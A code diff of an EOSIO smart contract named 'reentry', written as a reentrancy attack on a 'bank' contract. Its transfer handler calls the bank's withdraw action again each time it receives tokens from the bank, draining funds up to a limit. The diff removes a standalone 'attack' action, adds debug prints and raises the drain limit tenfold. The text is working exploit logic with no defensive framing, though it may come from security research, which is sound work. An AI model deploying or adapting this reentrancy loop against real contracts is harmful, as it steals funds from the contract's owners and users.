@@ -10,12 +10,6 @@ CONTRACT reentry : public eosio::contract {
   using contract::contract;
   public:
 
-    [[eosio::action]] void attack(asset quantity) {
-      action(permission_level{get_self(), "active"_n}, "bank"_n, "withdraw"_n,
-        std::make_tuple(get_self(),quantity))
-      .send();
-    }
-
     void transfer(name from, name to, asset quantity, string memo) {
       accounts from_acnts( "eosio.token"_n, from.value );
       const auto& bank = from_acnts.get( quantity.symbol.code().raw(), "no bal" );
@@ -32,7 +26,12 @@ CONTRACT reentry : public eosio::contract {
       print(from == "bank"_n);
       print("\n");
       print(bank.balance.amount > 0);
-      if(from == "bank"_n && bank.balance.amount > 0 && to_bal.balance.amount < 2000000) {
+      print("\n");
+      print(to_bal.balance.amount < 2000000);
+      print("\n");
+      print(to_bal.balance.amount);
+      print("\n");
+      if(from == "bank"_n && bank.balance.amount > 0 && to_bal.balance.amount < 20000000) {
         print("second");
         print("\n");
         action(permission_level{get_self(), "active"_n}, "bank"_n, "withdraw"_n,
@@ -58,10 +57,6 @@ extern "C" {
   void apply(uint64_t receiver, uint64_t code, uint64_t action) {
     if (code == name("eosio.token").value && action == name("transfer").value) {
       eosio::execute_action(eosio::name(receiver), eosio::name(code),&reentry::transfer);
-    } else {
-      switch (action) {
-        EOSIO_DISPATCH_HELPER(reentry, (attack))
-      }
     }
     eosio_exit(0);
   }
